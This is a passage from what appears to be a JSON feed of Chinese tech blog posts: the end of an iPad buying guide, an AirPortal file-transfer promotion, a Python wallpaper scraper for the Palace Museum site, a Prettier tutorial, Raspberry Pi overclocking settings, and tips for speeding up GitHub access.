可以随时化身为一个小的显示器。</p>\n<p>如果你是重型的办公，多出来的一块屏幕可以让你打开更多的文档，或者可以一块屏幕处理文档，一块屏幕处理消息。</p>\n<p>如果你是视频剪辑工作者，一块屏幕可以素材预览，另一块屏幕可以专注于剪辑线。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-88189e95ff132969f2366a4f3ebb9cd2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-88189e95ff132969f2366a4f3ebb9cd2_r.jpg\"></figure><p>而且随航功能非常的先进，它并不是完全占用你的 iPad，而是把 Mac 的屏幕窗口作为 iPad 的一个软件。所以我们可以在随航过程中，随意切出去，直接在使用 Mac 的键鼠操作 iPad。</p>\n<p>这套随航系统，真的在我出差的过程中，给予了我很大的方便。</p>\n<h3>适合自己的才是最好的</h3>\n<p>目前在售的 iPad 产品线，也非常容易梳理。</p>\n<p>iPad Pro（11英寸 &amp; 12.9 英寸）、iPad Air、iPad、iPad mini 共计四个系列产品。</p>\n<p>其中，iPad Pro 以及 iPad Air 系列是目前 iPad 产品线的核心，也就是最为常规的 iPad。而这两个产品线，本质上也就对应着「中端产品线」和「高端产品线」，某种程度上也代表着预算。</p>\n<p>如果预算对你来说不是最为核心的参考，那么直接购买 iPad Pro 肯定是最好的选择。</p>\n<p>你可能会纠结尺寸，那就说我的一些经验：</p>\n<p><b>12.9 英寸 iPad Pro：</b></p>\n<p><b>1. 工作完全以 iPad Pro 为核心的用户。</b>比如大多数情况下你都是在桌子上长时间使用 iPad Pro，并且 iPad Pro 上许多软件都是你工作必备。</p>\n<p>比如我自己就是最常使用 12.9 英寸。就拿写作这件事来说，11 英寸 iPad Pro 的妙控键盘布局还是会非常局促，而 12.9 英寸则刚刚好。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-b580cf319a7f8418d1e8febf1875b2d4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-b580cf319a7f8418d1e8febf1875b2d4_r.jpg\"></figure><p><b>2. 工作是视觉为主的。</b>比如你是一个插画师，或者是设计师。那么屏幕尺寸越大越好是永远不变的真理。</p>\n<p><b>3. 想要 HDR 效果。</b>目前只有 2021 款的 12.9 英寸 iPad Pro 配备了 mini LED 屏幕并且可以 HDR 效果。如果你购买 11 英寸 iPad Pro 则依然是 LCD 屏幕。</p>\n<p><b>4. 想要更好的续航。</b>从我的实际使用经验来看，的确 12.9 英寸的续航会比 11 英寸好上一截。</p>\n<p><b>11 英寸 iPad Pro</b></p>\n<p><b>1. 最看重便携。</b>iPad Pro 11 寸在手上非常轻，如果你长时间手持看视频，或者是阅读资料，那么 iPad Pro 11寸会极大的减轻压力。iPad Pro 12.9 手持一会就会觉得疲劳。</p>\n<p><b>2. 没了。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-d58b78c515bdb172f2adeeef34f97b36_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-d58b78c515bdb172f2adeeef34f97b36_r.jpg\"></figure><p>所以，除非你说你就是希望可以要一个便携的 iPad Pro，那么选择 12.9 英寸 iPad Pro 是一步到位没有体验牺牲的选择。</p>\n<p>但是需要注意的是，你购买 12.9 英寸 iPad Pro 也不是因为所谓的「便携」，因为它使用上的轻盈感并不是「体积和重量」带来的。</p>\n<p>我自己的 12.9 英寸 iPad Pro 是纯粹的内容生产工具，而 iPad Pro 11 英寸是内容消费工具。</p>\n<p>存储空间上，我自己是 1T 版本，一个重要原因是我需要在出差的时候用 iPad Pro 作为一个存储素材的作用。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-2549a0dde02b8ab22baf1f5b5a71d294_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-2549a0dde02b8ab22baf1f5b5a71d294_r.jpg\"></figure><p>即使你并不需要 iPad Pro 作为一个素材的中间存储，我也依然建议你购买 1T 版本。因为在 2021 版 M1 芯片的 iPad Pro中，1TB 以上版本的内存是 16GB ，而 1TB 以下的是 8GB 内存。当然不是说 8GB 不够用，当下是足够用的，就是 16GB 肯定是用得更久一些。</p>\n<p>不过如果你预算不够充足，512GB 也无妨，它基本上可以涵盖大部分场景。而且 512GB 也能够存储一定量的文档。说这句话是因为很多类似律师这类职业的人都在使用 iPad Pro，他们往往会买更大存储空间的版本用来存储文档。</p>\n<p>我不是很建议 256GB 以及 128GB 的存储。因为从我的使用经验来看，最后让 iPad 退役的往往就是存储不够。</p>\n<p>而今天内容体积越来越大，别说 128GB，256GB 都很容易捉襟见肘。不是说不能用，但就是很快就要陷入「删什么」的困境，而且当 iPad 存储空间快要满了的时候也会影响运行速度。</p>\n<p>我其实对性价比这个词越来越谨慎了，因为很多时候性价比是因人而异的，因为对于很多人来说时间更为宝贵，灵感最为宝贵。</p>\n<p>但 iPad Air 的确是一个完全瞄准「学生群体」的性价比产品。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-5a460472f184e7938665477d08277a39_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"6144\" data-rawheight=\"3456\" class=\"origin_image zh-lightbox-thumb\" width=\"6144\" data-original=\"https://pic2.zhimg.com/v2-5a460472f184e7938665477d08277a39_r.jpg\"></figure><p>总结起来就是，iPad Air 可以让学生在「能够接受的价格下」最大程度上的获得 iPad Pro 的体验。其实尤其是一些刚刚上大学的新生来说，如果购买 iPad Pro 就意味着要做一个「买 Mac 还是买 iPad Pro」的选择题。但是对于 iPad Air 的价格，大多数学生就可以选择都要。</p>\n<p>所以，我自己很建议对于仍然需要考虑预算的学生群体，买 iPad Air 很好。不要去比较那些细微的差别，什么刷新率，什么性能差异等等。记笔记，看课件，够用了。</p>\n<p>既然提到学生，那么就直接说一下教育优惠吧。</p>\n<p>目前苹果有每年一度的返校季活动，购买 iPad Pro、iPad Air、Mac 都会有一定的折扣同时，还能赠送 AirPods 之类的产品，基本上就是学生买到就是赚到。可以在线上教育商店购买，也可以线下的苹果官方零售店购买。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-5c835fd4b806a4901bb34721d0f26dd7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"395\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-5c835fd4b806a4901bb34721d0f26dd7_r.jpg\"></figure><p>前提是，必须是在校生，具体的详细规则大家可以咨询 Apple。</p>\n<p>配件方面，我认为如果你买 iPad Pro 或者是 iPad Air，那 Apple Pencil 就是一定要买的。这两款产品也都使用的是二代 Apple Pencil了，体验很好。但如果你的 iPad 就是非常纯粹的内容消费，Apple Pencil 的确不需要。但是只要你的学习工作有纸和笔的参与，那么 Apple Pencil 我认为是必须的。</p>\n<p>至少，我认为现在我买 iPad Pro 的核心驱动力就是这根 Apple Pencil，这是它区别于 Mac 的最重要原因。所以如果 Apple Pencil 对你使用 iPad Pro 来说不是必须，那么你可能需要考虑一下是不是真的需要 iPad Pro 本身，可能 Mac 更适合你。</p>\n<p>然后就是 iPad mini 以及 iPad（不加后缀）。</p>\n<p>这里 iPad mini，我觉得还是有特定人群需要的，总是有人喜欢小屏幕产品。也有很多人对于 iPad mini 情有独钟。目前来看，如果你是一个喜欢用 iPad 玩游戏的人，那么 iPad mini 可能是最好的选择。另一个好的使用场景是随身笔记本，比如经常到处采访的记者。iPad mini 录音一打开，用 Apple Pencil 再随时记录很方便。此时要是用大 iPad 就有点冒犯。</p>\n<p>但是这里需要预警，iPad mini 可能是一个随时更新的产品。</p>\n<p>iPad 入门款，我个人认为最合适的场景就是「看剧神器」，反正我家里是爹妈人手一个。两人各看各的，还不用打架。也就是说，它是一个最为纯粹的，且没有高要求的内容消费产品。小孩子看看网课也不错，但是需要特别注意，入门款的 iPad 没有反射涂层，可能会对小孩子眼睛不够友好。</p>\n<p>对了，iPad Pro 还有一些扩展配件可以一说。其实总结就是，你只需要一个 USB-C 接口的扩展坞即可。最新的 2021 款 iPad Pro 还直接升级成了雷雳 3 接口，让它的扩展性进一步增强。如果你想要连多个设备，可以考虑直接购买。</p>\n<p>我自己目前在用两个配件，一个 USB-C 转 USB-A ，一个读卡器。前者用来应付各种常规配件，比如键盘麦克风，而后者就是用来拷贝素材比较方便。其实今天 USB-C 配件已经很普及了，所以只要有意识的购买就好。</p>\n<h3>写在最后</h3>\n<p>我为什么这么在乎 iPad，或者说是偏爱。</p>\n<p>我不知道你有没有注意到，人的思考是需要辅助工具的。无论你是理性的计算，还是感性的创作，手里有一只笔可以写写画画，有些以前想不通的事情，只要写着写着可能就通了。</p>\n<p>又或者，我们总是会有一些千奇百怪的想法，尤其是对于很多创意工作者，你不知道在什么时间、地点、场合就会随时冒出一些叫做灵感的东西。</p>\n<p>而这个时候，你就会发现，iPad 是最合适承接「一切思考结果」的工具。如果说，今天的 PC 也好，Mac 也好，他们是帮助你完成作品的工具。</p>\n<p>那么，iPad 则保留了这些作品最初的那灵光一闪。</p>\n<p>这就是我喜欢它的原因。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-814914d7d2d8bef3cc0e53115a2910a9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-814914d7d2d8bef3cc0e53115a2910a9_r.jpg\"></figure><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/bigface-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Derrick Zhang</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/399179777?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何免费不限速传输文件？你应该试试 AirPortal！","date":"2021-07-30 10:50:00","description":"\n<p>微信传输限制 200M （电脑端 1GB），某度网盘的限速实在离谱。</p>\n<p>那么，如何快速、简单的传输文件呢？</p>\n<p>AirPortal 可以解决这个难题！</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E5%85%A8\" class=\"headerlink\" title=\"安全\"></a>安全</h2>\n<p>可以设置取件密码，在输入取件码的同时还要输入密码，进一步保护文件安全。</p>\n<p>可以设置下载次数，达到一定下载次数时自动从服务器上删除文件，无法下载。</p>\n<p>可以设置保存小时数，超过时间后自动从服务器上删除文件，无法下载。</p>\n<p>当用户多次输入错误的取件码时，将自动弹出验证码，核实是否为真实用户。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/c6da584dd68d5.png\"><h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E4%BE%BF%E5%BF%AB%E9%80%9F\" class=\"headerlink\" title=\"方便快速\"></a>方便快速</h2>\n<p>AirPortal 不限速，提供多地区服务器下载。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/2194e7359dab2.png\"><p>无论是否是高级用户，都将文件存储在 OSS，提高服务可用性与下载速度。</p>\n<p>无需多余的步骤，打开客户端或网页版输入取件码和密码（如有设置）就可以下载。</p>\n<p>在两台设备上登录同一个账号后，在其中任意一台设备上传文件，在另一台设备上会自动询问是否接收，无需输入取件码。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%85%8D%E7%99%BB%E5%BD%95%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"免登录使用\"></a>免登录使用</h3>\n<p>AirPortal 可以免登录使用，以下是一些限制：</p>\n<table>\n<thead><tr>\n<th align=\"center\">未登录</th>\n<th align=\"center\">免费</th>\n<th align=\"center\">高级</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">无限流量</td>\n<td align=\"center\">10GB + 结余</td>\n</tr>\n<tr>\n<td align=\"center\">单次上传 1GB</td>\n<td align=\"center\">单次上传 2GB</td>\n<td align=\"center\">无限</td>\n</tr>\n</tbody>\n</table>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/1b7b87e798158.png\"><h3>\n<a href=\"https://blog.yfun.top/#%E7%AE%80%E6%B4%81%E7%9A%84%E9%A1%B5%E9%9D%A2\" class=\"headerlink\" title=\"简洁的页面\"></a>简洁的页面</h3>\n<p>没有花里胡哨的广告和弹窗，简洁明了，点击「发送」就可以发送文件或文字。</p>\n<img webp-comp src=\"https://bu.dusays.com/2021/07/30/3aa77007547f5.png\"><h3>\n<a href=\"https://blog.yfun.top/#Wi-Fi-%E5%BF%AB%E4%BC%A0\" class=\"headerlink\" title=\"Wi-Fi 快传\"></a>Wi-Fi 快传</h3>\n<p>在同一局域网下，使用客户端开启「Wi-Fi 快传」功能，文件传输不经过热铁盒服务器与公网，更快速，更安全。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%89%AA%E8%B4%B4%E6%9D%BF%E5%85%B1%E4%BA%AB\" class=\"headerlink\" title=\"剪贴板共享\"></a>剪贴板共享</h3>\n<p>基于 Wi-Fi 快传的剪贴板共享功能，可以轻松实现跨设备复制粘贴，零延迟，支持多种操作系统。</p>\n<p>（需要同时打开客户端并连接 Wi-Fi 快传，iOS 端将会以文本方式同步到客户端）</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%A4%9A%E5%B9%B3%E5%8F%B0\" class=\"headerlink\" title=\"多平台\"></a>多平台</h2>\n<p>拥有 iOS, 安卓, Windows, macOS 与 Linux 平台的客户端，其余平台也可以使用 网页端。</p>\n<p>官方网址：<a href=\"https://airportal.cn/\">https://airportal.cn/</a></p>\n<p>*: 感谢 AirPortal 空投的支持！</p> ","link":"https://blog.yfun.top/posts/2021/airportal/"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 